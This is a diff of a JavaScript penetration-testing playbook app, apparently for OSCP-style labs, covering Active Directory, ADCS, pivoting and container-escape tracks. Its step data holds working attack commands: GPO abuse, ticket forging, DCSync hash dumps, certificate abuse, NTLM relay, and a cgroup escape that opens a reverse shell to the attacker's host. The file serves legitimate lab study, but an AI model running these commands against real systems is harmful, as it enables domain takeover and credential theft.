    {d:"Collector not working? there are three, and they disagree",c:"rusthound-ce -d {DOMAIN} -u {USER} -p {PASS} -i {IP} -c All -z\n.\\SharpHound.exe -c All --zipfilename out.zip        # from a Windows session\nbloodhound-python -d {DOMAIN} -u {USER} -p {PASS} -ns {IP} -c all --zip",l:"<b>RustHound-CE</b> is the current collector for BloodHound Community Edition: one static Rust binary, much faster than the Python one and far less fussy about a broken LDAP or DNS setup, which is usually what makes <code>bloodhound-python</code> fail. <b>SharpHound</b> runs from a Windows session and sees things a remote collector cannot. If a collection looks suspiciously empty, try another collector before believing the graph — and check the clock, since Kerberos fails on more than five minutes of skew."},
@@ -807,17 +906,17 @@ const TRACKS=[
    {d:"Read shares and GPP for more creds",c:"nxc smb {IP} -u {USER} -p {PASS} -M gpp_password; nxc smb {IP} -u {USER} -p {PASS} --shares",l:"SYSVOL GPP passwords and readable shares are common cred sources."},
    {d:"Found a Groups.xml by hand (anonymous share / no creds)? decrypt the cpassword",c:"gpp-decrypt 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ'",l:"When you pull <code>Groups.xml</code> from a readable share yourself (e.g. the Replication share on a null session), the <code>cpassword</code> is AES-encrypted with a key Microsoft published. <code>gpp-decrypt</code> reverses it. This is the whole of the <i>Active</i> box."}
  ]},
- {n:3,title:"Find the path",tag:"recon",goal:"Pick the route to higher privilege",steps:[
+ {n:3,title:"Find the path",tag:"recon",goal:"Pick the route to higher privilege",when:c=>c.creds>0,needs:"a domain credential",steps:[
    {d:"In BloodHound, mark owned and query shortest paths",c:"# Shortest Paths to Domain Admins / from Owned Principals",l:"Look for ACL edges (GenericAll, WriteDACL, ForceChangePassword, AddMember) and delegation."},
    {d:"Write access to a GPO is write access to every machine it links",c:"# GPO id comes from the gPCFileSysPath, or the first CN of the object's DN\npython3 pygpoabuse.py {DOMAIN}/{USER}:{PASS} -gpo-id 31B2F340-016D-11D2-945F-00C04FB984F9 \\\n  -command 'net localgroup administrators {USER} /add' -f\n# with a hash instead:  -hashes :<nt-hash>",l:"BloodHound edges <b>GenericWrite</b>, <b>GenericAll</b> or <b>WriteDACL</b> on a GPO object are easy to skim past, and they are often the shortest path to Domain Admin: the GPO writes an <i>immediate scheduled task</i> that runs as SYSTEM on <b>every</b> computer the GPO is linked to — including the domain controller when the linked OU is Domain Controllers. <b>pyGPOAbuse</b> does it remotely; SharpGPOAbuse needs a session on a domain host and Defender knows it well. Check what the GPO is linked to before firing, because this changes every machine in scope. <code>gpupdate /force</code> only speeds up what would happen anyway. The <i>Sysco</i> and <i>Odyssey</i> domain compromises."},
    {d:"Abuse the ACL the graph shows",c:"# ForceChangePassword: net rpc password <target> -U {DOMAIN}/{USER}%{PASS} -S {IP}\n# GenericAll on a group (add yourself):  net rpc group addmem '<group>' {USER} -U {DOMAIN}/{USER}%{PASS} -S {IP}\n# WriteDACL on the domain -> grant yourself DCSync, then secretsdump:\n#   Add-DomainObjectAcl -PrincipalIdentity {USER} -TargetIdentity '{DOMAIN}\\Domain Admins' -Rights DCSync",l:"Each BloodHound edge has a known abuse. ForceChangePassword / GenericAll / WriteDACL are the common ones; the WriteDACL\u2192DCSync grant is the <i>Forest</i> path. The Hacker Recipes lists the exact command per edge."}
  ]},
- {n:4,title:"Lateral movement",tag:"attack",goal:"Execute on other hosts with what you have",steps:[
+ {n:4,title:"Lateral movement",tag:"attack",goal:"Execute on other hosts with what you have",when:c=>c.creds>0,needs:"a domain credential",steps:[
    {d:"Pass the hash or password to a shell",c:"impacket-wmiexec {DOMAIN}/{USER}:{PASS}@{IP}    # or -hashes LM:NT",l:"psexec, smbexec, wmiexec, atexec, or evil-winrm all take -H for a hash."},
    {d:"Overpass-the-hash / use a Kerberos ticket",c:"# getTGT with the hash, export KRB5CCNAME, then -k -no-pass",l:"Needed when only Kerberos auth is allowed, and for ticket attacks."},
    {d:"Silver ticket: a service account hash is admin on that one service",c:"impacket-lookupsid {DOMAIN}/{USER}:{PASS}@{IP} 0 | grep 'Domain SID'\nimpacket-ticketer -nthash <svc-nt-hash> -domain-sid S-1-5-21-... -domain {DOMAIN} \\\n  -spn MSSQLSvc/sql.{DOMAIN}:1433 -user-id 500 Administrator\nexport KRB5CCNAME=Administrator.ccache\nimpacket-mssqlclient {DOMAIN}/Administrator@sql.{DOMAIN} -k -no-pass",l:"Kerberoasting hands you a service account password; this turns it straight into <b>Administrator on that service</b> without touching krbtgt, DCSync or a domain admin. You forge the TGS yourself, so the DC never sees the request and never checks whether the user exists — <code>-user-id 500</code> simply asserts you are the built-in Administrator. Scope is the one SPN you sign for. Get the domain SID from <code>lookupsid</code> or <code>Get-DomainSID</code>, and use the <i>service</i> account's hash, not the machine's. The <i>Nagoya</i> route to MSSQL when <code>xp_cmdshell</code> is denied to your own account."}
  ]},
- {n:5,title:"Domain dominance",tag:"post-exploit",goal:"Own the domain and prove it",steps:[
+ {n:5,title:"Domain dominance",tag:"post-exploit",goal:"Own the domain and prove it",when:c=>c.creds>0,needs:"a domain credential",gives:"root",steps:[
    {d:"DCSync to pull the krbtgt and admin hashes",c:"impacket-secretsdump {DOMAIN}/{USER}:{PASS}@{IP}",l:"Needs replication rights (Domain Admin, or an ACL that grants it). Dumps the whole domain."},
    {d:"Azure AD Connect on the box? it stores a DA password it can decrypt",c:"# as a member of the sync/Azure Admins group, against the local ADSync DB:\n# azuread_decrypt_msol.ps1   (reads the keyset from ADSync, decrypts with mcrypt.dll)",l:"A server running AD Connect keeps the on-prem sync account\u2019s credential encrypted in its local <code>ADSync</code> SQL database, and anyone who can read that database can decrypt it \u2014 the account is usually a Domain Admin or has DCSync rights. Look for <code>C:\\Program Files\\Microsoft Azure AD Sync</code>. The <i>Monteverde</i> root."},
    {d:"Log in as Administrator and grab proof",c:"evil-winrm -i {IP} -u Administrator -H <admin-nt-hash>",l:"Golden ticket with the krbtgt hash gives durable domain-wide access if you need persistence."}
@@ -829,17 +928,17 @@ const TRACKS=[
  blurb:"Post-OSCP Active Directory: certificate services (ADCS), delegation, coercion and MSSQL. Reach for this when the core AD track stalls and BloodHound shows a cert or delegation edge.",
  phases:[
  {n:1,title:"ADCS: find vulnerable templates",tag:"recon",goal:"Enumerate the CA and its templates for an ESC",steps:[
-   {d:"Server 2025 domain? check for BadSuccessor before anything clever",c:"nxc ldap {IP} -u {USER} -p {PASS} -M badsuccessor      # who can create a dMSA, and where\npython3 badsuccessor.py -dmsa-name svc_x -target-ou 'OU=Servers,DC=example,DC=com' \\\n  -dc-ip {IP} -dc-host dc01.example.com -method LDAP {DOMAIN}/{USER}:{PASS}",l:"A <b>dMSA</b> (delegated Managed Service Account) is new in Windows Server 2025, and its migration process trusts whatever the account names as its predecessor. <b>CreateChild</b> on any OU is therefore enough: make a dMSA, name a Domain or Enterprise Admin as its successor, and the KDC hands you that account's keys in the dMSA's <i>Previous Keys</i> — no ACL on the victim, no ADCS, no delegation. It is a one-step path from a low-privilege user to the top of the domain, so check it first on any 2025 DC (<code>nxc</code> reports the build). The <i>MidGarden2</i> Enterprise Admin."},
-   {d:"Enumerate with certipy (any domain creds)",c:"certipy find -u {USER}@{DOMAIN} -p {PASS} -dc-ip {IP} -stdout -vulnerable",l:"Flags each template ESC1\u2013ESC16. Note the <b>CA name</b> and the <b>template name</b> \u2014 you need both to request. Use <code>-hashes :NTHASH</code> instead of <code>-p</code> to authenticate with a hash."},
+   {when:c=>c.creds>0,needs:"a domain credential",d:"Server 2025 domain? check for BadSuccessor before anything clever",c:"nxc ldap {IP} -u {USER} -p {PASS} -M badsuccessor      # who can create a dMSA, and where\npython3 badsuccessor.py -dmsa-name svc_x -target-ou 'OU=Servers,DC=example,DC=com' \\\n  -dc-ip {IP} -dc-host dc01.example.com -method LDAP {DOMAIN}/{USER}:{PASS}",l:"A <b>dMSA</b> (delegated Managed Service Account) is new in Windows Server 2025, and its migration process trusts whatever the account names as its predecessor. <b>CreateChild</b> on any OU is therefore enough: make a dMSA, name a Domain or Enterprise Admin as its successor, and the KDC hands you that account's keys in the dMSA's <i>Previous Keys</i> — no ACL on the victim, no ADCS, no delegation. It is a one-step path from a low-privilege user to the top of the domain, so check it first on any 2025 DC (<code>nxc</code> reports the build). The <i>MidGarden2</i> Enterprise Admin."},
+   {when:c=>c.creds>0,needs:"a domain credential",d:"Enumerate with certipy (any domain creds)",c:"certipy find -u {USER}@{DOMAIN} -p {PASS} -dc-ip {IP} -stdout -vulnerable",l:"Flags each template ESC1\u2013ESC16. Note the <b>CA name</b> and the <b>template name</b> \u2014 you need both to request. Use <code>-hashes :NTHASH</code> instead of <code>-p</code> to authenticate with a hash."},
    {d:"No creds yet? the web-enrollment endpoint is a tell",c:"curl -sI http://{IP}/certsrv/    # 401 = ADCS web enrollment present (ESC8 candidate)",l:"<code>certsrv</code> over HTTP is the relay target for ESC8."}
  ],
   tips:["ESC1 (arbitrary SAN), ESC8 (HTTP relay) and ESC4 (weak template ACL) are the common ones \u2014 certipy names the exact ESC in its output.","BloodHound (with the certipy/Certipy-BloodHound collector) also draws the cert paths."]},
- {n:2,title:"ESC1 \u2014 request a cert as anyone",tag:"privesc",goal:"Enrol a certificate with an arbitrary SAN, then authenticate as admin",steps:[
+ {n:2,title:"ESC1 \u2014 request a cert as anyone",tag:"privesc",goal:"Enrol a certificate with an arbitrary SAN, then authenticate as admin",when:c=>c.creds>0,needs:"a domain credential",steps:[
    {d:"Request the cert for the administrator UPN",c:"certipy req -u {USER}@{DOMAIN} -p {PASS} -dc-ip {IP} -ca <CA-NAME> -template <VULN-TEMPLATE> -upn administrator@{DOMAIN}",l:"ESC1 = the template allows a client-auth cert with an arbitrary <code>subjectAltName</code>. Saves <code>administrator.pfx</code>."},
    {d:"Only computers can enrol? add a machine account first",c:"addcomputer.py '{DOMAIN}/{USER}:{PASS}' -method LDAPS -computer-name df -computer-pass df0xdf0xdf -dc-ip {IP}",l:"Default <code>MachineAccountQuota</code> lets any user add 10 computers. Then <code>certipy req</code> with <code>-username 'df$' -password df0xdf0xdf</code> and add <code>-dns {DOMAIN}</code> (the <i>Authority</i> pattern)."},
    {d:"Turn the cert into a hash / TGT",c:"certipy auth -pfx administrator.pfx -dc-ip {IP}",l:"Returns the NT hash and a TGT \u2014 pass-the-hash from there. If it errors <code>KDC_ERR_PADATA_TYPE_NOSUPP</code> the DC has no PKINIT: use pass-the-cert (next phase)."}
  ],branch:["Got the admin hash \u2192 Pass the hash (core AD track), or secretsdump"]},
- {n:3,title:"Pass-the-cert (PKINIT not supported)",tag:"privesc",goal:"Use the certificate over LDAP when Kerberos auth fails",steps:[
+ {n:3,title:"Pass-the-cert (PKINIT not supported)",tag:"privesc",goal:"Use the certificate over LDAP when Kerberos auth fails",when:c=>c.creds>0,needs:"a domain credential",steps:[
    {d:"Split the pfx into crt + key",c:"certipy cert -pfx administrator.pfx -nocert -out admin.key; certipy cert -pfx administrator.pfx -nokey -out admin.crt",l:"<code>passthecert</code> wants the certificate and key as separate files."},
    {d:"LDAP shell with the certificate",c:"passthecert.py -action ldap-shell -crt admin.crt -key admin.key -domain {DOMAIN} -dc-ip {IP}",l:"In the shell, add yourself to Domain Admins or grant DCSync. The <i>Authority</i> path."}
  ]},
@@ -847,23 +946,23 @@ const TRACKS=[
    {d:"Stand up the relay to the CA's certsrv",c:"certipy relay -target 'http://<CA-HOST>' -template DomainController",l:"Or <code>ntlmrelayx.py -t http://&lt;CA&gt;/certsrv/certfnsh.asp -smb2support --adcs --template DomainController</code>."},
    {d:"Coerce the DC to authenticate to you",c:"coercer coerce -u {USER} -p {PASS} -t {IP} -l {LHOST}",l:"Or <code>PetitPotam.py</code> / <code>printerbug.py</code>. The DC's Net-NTLM is relayed, you get a DC certificate, then <code>certipy auth</code> for the DC hash \u2192 DCSync."}
  ]},
- {n:5,title:"Shadow credentials & ACL edges",tag:"privesc",goal:"Turn a GenericWrite / WriteOwner edge into a hash",steps:[
+ {n:5,title:"Shadow credentials & ACL edges",tag:"privesc",goal:"Turn a GenericWrite / WriteOwner edge into a hash",when:c=>c.creds>0,needs:"a domain credential",steps:[
    {d:"Shadow Credentials on a target you can write",c:"certipy shadow auto -u {USER}@{DOMAIN} -p {PASS} -account <target-user> -dc-ip {IP}",l:"Adds a key credential to <code>msDS-KeyCredentialLink</code> and pulls the target's NT hash back. Needs GenericWrite/GenericAll over the target (BloodHound shows it). <code>pywhisker</code> + <code>PKINITtools</code> is the manual route."},
    {d:"WriteOwner \u2192 take the object, then grant yourself rights",c:"owneredit.py -action write -new-owner {USER} -target '<group>' {DOMAIN}/{USER}:{PASS} -dc-ip {IP}; dacledit.py -action write -rights WriteMembers -principal {USER} -target '<group>' {DOMAIN}/{USER}:{PASS} -dc-ip {IP}",l:"Then <code>net rpc group addmem</code> to add yourself. <code>bloodyAD</code> does it in one tool: <code>bloodyAD --host {IP} -d {DOMAIN} -u {USER} -p {PASS} add groupMember '&lt;group&gt;' {USER}</code>."},
    {d:"ESC9 / ESC10 \u2014 UPN manipulation",c:"certipy account update -u {USER}@{DOMAIN} -p {PASS} -user <target> -upn administrator@{DOMAIN}",l:"With GenericWrite over a user, set their UPN to administrator, request a cert as them, then restore the UPN. The <i>Certified</i> path."}
  ]},
- {n:6,title:"Delegation & RBCD",tag:"privesc",goal:"Abuse Kerberos delegation for a privileged ticket",steps:[
+ {n:6,title:"Delegation & RBCD",tag:"privesc",goal:"Abuse Kerberos delegation for a privileged ticket",when:c=>c.creds>0,needs:"a domain credential",steps:[
    {d:"RBCD \u2014 write msDS-AllowedToActOnBehalfOfOtherIdentity",c:"rbcd.py -delegate-from 'df$' -delegate-to '<target>$' -action write '{DOMAIN}/{USER}:{PASS}' -dc-ip {IP}",l:"Needs GenericWrite/GenericAll over the target computer. <code>df$</code> is a machine account you control (<code>addcomputer.py</code>)."},
    {d:"S4U to impersonate an admin to the target",c:"getST.py -spn 'cifs/<target-fqdn>' -impersonate administrator '{DOMAIN}/df$:df0xdf0xdf' -dc-ip {IP}",l:"Also the play for constrained delegation. Then <code>export KRB5CCNAME=administrator.ccache</code> and <code>psexec.py -k -no-pass &lt;target-fqdn&gt;</code>."},
    {d:"Unconstrained delegation \u2014 coerce and capture a TGT",c:"krbrelayx.py -hashes :<hash>   # then coerce the DC: printerbug.py '{DOMAIN}/{USER}:{PASS}'@<deleg-host> {LHOST}",l:"The DC's TGT lands in your listener; extract it and DCSync."}
  ],branch:["Got a ccache / hash \u2192 psexec.py -k / secretsdump (core AD track)"]},
- {n:7,title:"MSSQL",tag:"attack",goal:"From MSSQL creds to code execution, hashes and linked servers",steps:[
+ {n:7,title:"MSSQL",tag:"attack",goal:"From MSSQL creds to code execution, hashes and linked servers",when:c=>c.creds>0,needs:"a domain credential",steps:[
    {d:"Connect (SQL or Windows auth)",c:"impacket-mssqlclient {DOMAIN}/{USER}:{PASS}@{IP} -windows-auth",l:"Drop <code>-windows-auth</code> for a SQL login like <code>sa</code>. A blank or weak <code>sa</code> password is common."},
    {d:"Enable xp_cmdshell for code execution",c:"enable_xp_cmdshell; EXEC xp_cmdshell 'whoami'",l:"Needs sysadmin. <code>mssqlclient</code> has <code>enable_xp_cmdshell</code> built in."},
    {d:"Coerce a Net-NTLMv2 hash (no sysadmin needed)",c:"EXEC xp_dirtree '\\\\{LHOST}\\share', 1, 1    # Responder running",l:"Any login can do this \u2014 crack the service-account hash or relay it. <i>Escape</i>'s foothold."},
    {d:"Hop linked servers",c:"enum_links; use_link [<SERVER>]    # then EXECUTE AS LOGIN='sa', or exec on the far side",l:"Linked servers often run as sa on the remote instance. <code>EXEC ('&lt;query&gt;') AT [&lt;SERVER&gt;]</code> runs SQL there \u2014 chain them to reach a sysadmin context."}
  ]},
- {n:8,title:"Other quick wins",tag:"attack",goal:"Fast domain-wide checks worth trying",steps:[
+ {n:8,title:"Other quick wins",tag:"attack",goal:"Fast domain-wide checks worth trying",when:c=>c.creds>0,needs:"a domain credential",steps:[
    {d:"NoPac (CVE-2021-42278 / 42287)",c:"noPac.py {DOMAIN}/{USER}:{PASS} -dc-ip {IP} -dc-host <DC-NAME> --impersonate administrator -shell",l:"Machine-account name confusion \u2192 SYSTEM shell on the DC. Worth trying early against unpatched 2019 DCs."},
    {d:"Targeted Kerberoast (GenericWrite on a user)",c:"targetedKerberoast.py -d {DOMAIN} -u {USER} -p {PASS} --dc-ip {IP}",l:"Sets a temporary SPN on a user you can write, roasts it, then removes the SPN \u2014 reaches accounts that have no SPN of their own."}
  ]}
@@ -873,11 +972,11 @@ const TRACKS=[
 {id:"pivot",name:"Pivoting",colour:COL.pivot,
  blurb:"Once you own a host, reach the networks behind it.",
  phases:[
- {n:1,title:"Discover the internal network",tag:"recon",goal:"Find what the foothold can reach that you cannot",steps:[
+ {n:1,title:"Discover the internal network",tag:"recon",goal:"Find what the foothold can reach that you cannot",when:c=>c.shell!=="none",needs:"a shell on the box",steps:[
    {d:"Look for extra interfaces and neighbours",c:"ip a; arp -a; cat /etc/hosts   # win: ipconfig /all & arp -a & route print",l:"A second NIC or an odd subnet in the routing table is your next target range."},
    {d:"Sweep the internal range from the foothold",c:"for i in $(seq 1 254); do (ping -c1 -W1 10.10.20.$i >/dev/null && echo 10.10.20.$i up &); done",l:"Or push a static nxc/nmap binary and scan from inside."}
  ]},
- {n:2,title:"Build the tunnel",tag:"pivot",goal:"Route your tools through the foothold",steps:[
+ {n:2,title:"Build the tunnel",tag:"pivot",goal:"Route your tools through the foothold",when:c=>c.shell!=="none",needs:"a shell on the box",steps:[
    {d:"ligolo-ng (cleanest, gives you a real interface)",c:"# attacker: ./proxy -selfcert   target: ./agent -connect {LHOST}:11601",l:"Then add a route to the internal subnet and use tools natively, no proxychains."},
    {d:"chisel reverse SOCKS (very portable)",c:"./chisel server -p 8000 --reverse   # target: ./chisel client {LHOST}:8000 R:socks",l:"Point proxychains at the SOCKS port it opens."},
    {d:"Open proxy on the box? that is a tunnel you did not have to build",c:"# /etc/proxychains4.conf:  http {IP} 3128\nproxychains -q curl -sI http://127.0.0.1:8080/    # reach ports bound to localhost",l:"A misconfigured <b>Squid</b> (3128/8080) will forward requests to the target’s own loopback and to its internal neighbours, before you have any shell at all. <code>spose.py</code> or a proxychains <code>nmap -sT</code> enumerates what it can reach."},
@@ -885,7 +984,7 @@ const TRACKS=[
    {d:"Quick SSH options when you have SSH creds",c:"sshuttle -r {USER}@{IP} 10.10.20.0/24   # or ssh -D 1080 / -L / -R",l:"sshuttle is the least fuss when SSH is available."},
    {d:"The foothold is Windows and runs no SSH server",c:"# Windows 10 / 2019 and later ship an OpenSSH *client* — same flags, dial back to you:\nssh -R 1080 -N {USER}@{LHOST}\n# older builds: plink.exe, PuTTY's CLI (echo y accepts the host key non-interactively)\ncmd.exe /c echo y | plink.exe -ssh -l {USER} -pw <pass> -R 1080 {LHOST}\n# no SSH anywhere? the built-in port forwarder needs admin but no upload at all:\nnetsh interface portproxy add v4tov4 listenport=9999 connectaddress=10.200.180.200 connectport=3389",l:"The usual tunnels assume an SSH server on the pivot, which Windows rarely has. Turn it round and dial <i>out</i>: run <code>sshd</code> on your own box and have the foothold open a reverse tunnel into it. <code>netsh portproxy</code> is the no-upload fallback when the box is locked down — it survives reboots, so remove it (<code>... portproxy delete v4tov4 listenport=9999</code>) when you are done. The <i>Wreath</i> network pivots through its Windows host this way."}
  ]},
- {n:3,title:"Work through the tunnel",tag:"pivot",goal:"Enumerate and attack the internal hosts",steps:[
+ {n:3,title:"Work through the tunnel",tag:"pivot",goal:"Enumerate and attack the internal hosts",when:c=>c.shell!=="none",needs:"a shell on the box",steps:[
    {d:"Send tools through SOCKS",c:"proxychains -q nxc smb 10.10.20.0/24    # /etc/proxychains4.conf: socks5 127.0.0.1 1080",l:"Some tools dislike proxychains (raw sockets). Use a port-forward for those, or ligolo."},
    {d:"Then re-run recon against the new range",c:"proxychains -q nmap -sT -Pn -p- --min-rate 2000 10.10.20.10",l:"Use -sT connect scans through a SOCKS proxy, not SYN."}
  ],tips:["Note which host each tunnel runs through. When a session drops you need to know what you lost."]}
@@ -895,7 +994,7 @@ const TRACKS=[
 {id:"container",name:"Container escape",colour:COL.container,
  blurb:"You have a shell, but it is inside a container. Work out how it is confined, then break out to the host.",
  phases:[
- {n:1,title:"Am I in a container?",tag:"recon",goal:"Confirm containment and which runtime",steps:[
+ {n:1,title:"Am I in a container?",tag:"recon",goal:"Confirm containment and which runtime",when:c=>c.shell!=="none",needs:"a shell on the box",steps:[
    {d:"The give-away files",c:"ls -la /.dockerenv /run/.containerenv 2>/dev/null",
     l:"<code>/.dockerenv</code> is Docker; <code>/run/.containerenv</code> is Podman. Their absence does not rule a container out."},
    {d:"cgroup and PID 1 name the runtime",c:"cat /proc/1/cgroup; head -1 /proc/1/sched 2>/dev/null",
@@ -903,7 +1002,7 @@ const TRACKS=[
    {d:"Kubernetes leaves a token and env behind",c:"env | grep -i KUBERNETES; ls /run/secrets/kubernetes.io/serviceaccount/ 2>/dev/null",
     l:"A mounted service-account token means you are in a pod \u2014 go to the Kubernetes phase."}
  ],tips:["Few processes, a short hex hostname and a tiny package set are soft tells.","Knowing the runtime (Docker, Podman, LXC, containerd, CRI-O) decides which escape applies."]},
- {n:2,title:"Enumerate the confinement",tag:"recon",goal:"Capabilities, devices, mounts and sockets \u2014 the escape is almost always one of these",steps:[
+ {n:2,title:"Enumerate the confinement",tag:"recon",goal:"Capabilities, devices, mounts and sockets \u2014 the escape is almost always one of these",when:c=>c.shell!=="none",needs:"a shell on the box",steps:[
    {d:"Effective capabilities (the single most important check)",c:"capsh --print 2>/dev/null; grep Cap /proc/self/status",
     l:"Decode a hex value with <code>capsh --decode=&lt;hex&gt;</code>. <b>CAP_SYS_ADMIN</b>, <b>CAP_SYS_PTRACE</b>, <b>CAP_DAC_READ_SEARCH</b> and <b>CAP_SYS_MODULE</b> each have a known break-out."},
    {d:"Am I a privileged container?",c:"ls /dev | wc -l; fdisk -l 2>/dev/null",
@@ -915,7 +1014,7 @@ const TRACKS=[
    {d:"Shared namespaces and host processes",c:"ls -la /proc/1/ns/; ps aux | head",
     l:"Seeing host processes in <code>ps</code> means <code>--pid=host</code>; with CAP_SYS_PTRACE you can inject into one of them."}
  ],tips:["<b>deepce</b> and <b>CDK</b> automate all of this: <code>./deepce.sh</code> or <code>cdk evaluate --full</code>.","Record every capability and every mount before trying anything \u2014 the escape is usually already visible here."]},
- {n:3,title:"Docker socket / daemon",tag:"privesc",goal:"Abuse an exposed docker.sock or docker-group membership",steps:[
+ {n:3,title:"Docker socket / daemon",tag:"privesc",goal:"Abuse an exposed docker.sock or docker-group membership",when:c=>c.shell!=="none",needs:"a shell on the box",steps:[
    {d:"Docker client present: mount the host root and chroot in",c:"docker run -v /:/host -it alpine chroot /host bash",
     l:"You are now root on the host filesystem. If no image is cached, reuse one that is (<code>docker images</code>)."},
    {d:"No client? Drive the socket with curl",c:"curl -s --unix-socket /var/run/docker.sock http://localhost/images/json",
@@ -923,7 +1022,7 @@ const TRACKS=[
    {d:"Membership of the docker group is the same thing",c:"id; docker run -v /:/host -it alpine chroot /host sh",
     l:"Being in the <code>docker</code> group (check <code>id</code>) is root-equivalent on the host \u2014 container or not."}
  ],branch:["Root on the host filesystem \u2192 After the escape"]},
- {n:4,title:"Privileged / capability escapes",tag:"privesc",goal:"Turn --privileged or a dangerous capability into host code execution",steps:[
+ {n:4,title:"Privileged / capability escapes",tag:"privesc",goal:"Turn --privileged or a dangerous capability into host code execution",when:c=>c.shell!=="none",needs:"a shell on the box",steps:[
    {d:"Privileged: mount the host disk directly",c:"fdisk -l; mkdir -p /mnt/host; mount /dev/sda1 /mnt/host && chroot /mnt/host bash",
     l:"Pick the host root partition from <code>fdisk -l</code>. Then read /etc/shadow, drop an SSH key, or add a root cron."},
    {d:"CAP_SYS_ADMIN (+ permissive AppArmor): cgroup release_agent",c:"# 1. a cgroup we can mount (needs CAP_SYS_ADMIN, AppArmor off/permissive)\nmkdir -p /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp 2>/dev/null \\\n  || mount -t cgroup -o rdma cgroup /tmp/cgrp\nmkdir -p /tmp/cgrp/x && echo 1 > /tmp/cgrp/x/notify_on_release\n# 2. where this container's files live on the host (overlay upperdir)\nhost=$(sed -n 's/.*\\bupperdir=\\([^,]*\\).*/\\1/p' /etc/mtab | head -1)\necho \"$host/cmd\" > /tmp/cgrp/release_agent\n# 3. the payload that runs as ROOT on the host when the cgroup empties\nprintf '#!/bin/sh\\nbash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1\\n' > /cmd && chmod +x /cmd\n# 4. trigger it (listener up first)\nsh -c \"echo \\$\\$ > /tmp/cgrp/x/cgroup.procs\"",
@@ -936,13 +1035,13 @@ const TRACKS=[
     l:"<code>insmod</code> runs your code in the host kernel \u2014 total compromise. Needs the kernel headers for the running version (<code>/lib/modules/$(uname -r)/build</code>); build elsewhere and copy the .ko in if they are absent."}
  ],branch:["Root on the host \u2192 After the escape"],
   tips:["<b>--privileged or CAP_SYS_ADMIN is the usual lab/CTF path.</b> Check AppArmor and Seccomp first; the release_agent trick needs them off or permissive.","<b>CVE-2019-5736 (runc):</b> overwrite the host <code>runc</code> from inside the container, triggered the next time an admin <code>docker exec</code>s in."]},
- {n:5,title:"LXC / LXD group",tag:"privesc",goal:"Abuse lxd/lxc group membership (a classic lab escalation)",steps:[
+ {n:5,title:"LXC / LXD group",tag:"privesc",goal:"Abuse lxd/lxc group membership (a classic lab escalation)",when:c=>c.shell!=="none",needs:"a shell on the box",steps:[
    {d:"Membership of the lxd/lxc group is root on the host",c:"id | grep -E 'lxd|lxc'",
     l:"No exploit needed \u2014 the group lets you start a privileged container that mounts the host filesystem."},
    {d:"Import a tiny image, run a privileged container mounting /",c:"lxc image import ./alpine.tar.gz --alias esc; lxc init esc r -c security.privileged=true; lxc config device add r host disk source=/ path=/mnt/root recursive=true; lxc start r; lxc exec r sh",
     l:"Inside, the host filesystem is at <code>/mnt/root</code>. Build the image with <code>lxd-alpine-builder</code> (or <code>distrobuilder</code>) if none is present."}
  ],branch:["On the host filesystem \u2192 After the escape"]},
- {n:6,title:"Kubernetes",tag:"privesc",goal:"From a pod to the node, or the whole cluster",steps:[
+ {n:6,title:"Kubernetes",tag:"privesc",goal:"From a pod to the node, or the whole cluster",when:c=>c.shell!=="none",needs:"a shell on the box",steps:[
    {d:"Grab the service-account token and see what it can do",c:"cat /run/secrets/kubernetes.io/serviceaccount/token; kubectl auth can-i --list",
     l:"The token authenticates you to the API. <code>can-i --list</code> shows your rights \u2014 create pods is usually enough."},
    {d:"If you can create pods, schedule a privileged one that mounts the node",c:"# a pod that mounts the node's / and runs privileged = root on that node\ncat > /tmp/priv.yaml <<'EOF'\napiVersion: v1\nkind: Pod\nmetadata: { name: r }\nspec:\n  hostPID: true\n  hostNetwork: true\n  containers:\n  - name: r\n    image: alpine          # use an image the node can already pull\n    command: [\"/bin/sh\",\"-c\",\"sleep 1d\"]\n    securityContext: { privileged: true }\n    volumeMounts:\n    - { name: host, mountPath: /host }\n  volumes:\n  - name: host\n    hostPath: { path: / }\nEOF\nkubectl apply -f /tmp/priv.yaml\nkubectl exec -it r -- chroot /host bash",
@@ -950,7 +1049,7 @@ const TRACKS=[
    {d:"Hit the kubelet and the cloud metadata service",c:"curl -sk https://localhost:10250/pods; curl -s http://169.254.169.254/latest/meta-data/ 2>/dev/null",
     l:"A read/write kubelet API runs commands in pods. Cloud metadata can hand over node credentials."}
  ],tips:["<code>kubectl</code> is often absent \u2014 call the API with curl and the token as a <code>Bearer</code> header.","Once on the node, look for other pods' mounted secrets and tokens."]},
- {n:7,title:"After the escape",tag:"post-exploit",goal:"Confirm you are on the host, then prove it",steps:[
+ {n:7,title:"After the escape",tag:"post-exploit",goal:"Confirm you are on the host, then prove it",when:c=>c.shell!=="none",needs:"a shell on the box",gives:"root",steps:[
    {d:"Confirm you left the container",c:"hostname; id; head -1 /etc/shadow; ls /root",
     l:"A different hostname, the host's shadow file and the host's /root all confirm you are out."},
    {d:"Get a real foothold rather than living in a mount",c:"# add an SSH key to /root/.ssh/authorized_keys, or add a uid-0 line to the host /etc/passwd",
@@ -1070,14 +1169,14 @@ const TRACKS=[
 ]}
 ];
 
-const APP_VERSION="1.9.3";
+const APP_VERSION="1.10.0";
 
 // ---------- storage ----------
 // Everything lives in localStorage, so a private window or a full quota loses
 // the lot. Swallowing that silently is the worst outcome during a timed exam:
 // the first failed write raises a banner instead, and every successful one
 // flashes the save indicator so you can see the tool is keeping up.
-const STORE_PREFIXES=["playbook2:","notes2:","timer2:","scan2:","scantext:","evidence2:","attempts:","findings:","view2:"];
+const STORE_PREFIXES=["playbook2:","notes2:","timer2:","scan2:","scantext:","evidence2:","attempts:","findings:","view2:","vars2:"];
 const store={
   broken:false,
   get(k,d){try{const v=localStorage.getItem(k);return v===null?(d===undefined?null:d):v;}catch(_){this.fail();return d===undefined?null:d;}},
@@ -1110,6 +1209,35 @@ VARS.WPTOKEN=store.get("wptoken","")||"";
 // The arsenal page reads these so its commands fill in the same way (#16).
 function publishVars(){store.setJson("toolkit:vars",{IP:VARS.IP,LHOST:VARS.LHOST,LPORT:VARS.LPORT,
   DOMAIN:VARS.DOMAIN,USER:VARS.USER,PASS:VARS.PASS,BOX:VARS.BOX});}
+// The target variables were published for the other pages to read but never
+// read back, so a reload or a box switch silently emptied IP, LHOST, DOMAIN,
+// USER and PASS while the ticks, scan and credentials all came back. Every
+// {IP} in every command then rendered as <ip>. They are per-box state like
+// everything else, so they are stored and restored like everything else.
+function varsKey(){return "vars2:"+boxId();}
